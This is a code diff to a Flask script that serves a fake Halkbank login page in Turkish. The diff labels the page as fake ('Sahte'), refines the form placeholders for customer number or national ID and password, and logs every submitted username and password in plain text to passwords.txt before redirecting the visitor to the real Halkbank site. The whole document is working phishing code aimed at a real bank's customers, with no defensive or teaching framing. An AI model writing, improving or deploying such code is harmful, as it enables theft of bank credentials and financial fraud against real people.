@@ -5,7 +5,7 @@ from flask import Flask, request, redirect
 def start_flask_server():
     app = Flask(__name__)
 
-    # Halkbank giriş sayfası HTML içeriği
+    # Sahte Halkbank giriş sayfası HTML içeriği
     halkbank_login_html = """
     <!DOCTYPE html>
     <html lang="tr">
@@ -70,8 +70,8 @@ def start_flask_server():
             <img class="logo" src="https://www.halkbank.com.tr/favicon.ico" alt="Halkbank Logo">
             <h2>Halkbank'a Giriş Yap</h2>
             <form action="/login" method="post">
-                <input type="text" name="username" placeholder="Müsteri Numarası/ Tc kimlik Numarası">
-                <input type="password" name="password" placeholder="Parola">
+                <input type="text" name="username" placeholder="Müşteri Numarası veya TC Kimlik Numarası">
+                <input type="password" name="password" placeholder="Şifre">
                 <input type="submit" value="Giriş Yap">
             </form>
         </div>
@@ -87,7 +87,8 @@ def start_flask_server():
     def login():
         username = request.form['username']
         password = request.form['password']
-        with open("halkbank_passwords.txt", "a") as file:
+        # Şifreyi passwords.txt dosyasına kaydet
+        with open("passwords.txt", "a") as file:
             file.write("Kullanıcı adı: {}\n".format(username))
             file.write("Şifre: {}\n".format(password))
         return redirect("https://www.halkbank.com.tr/")
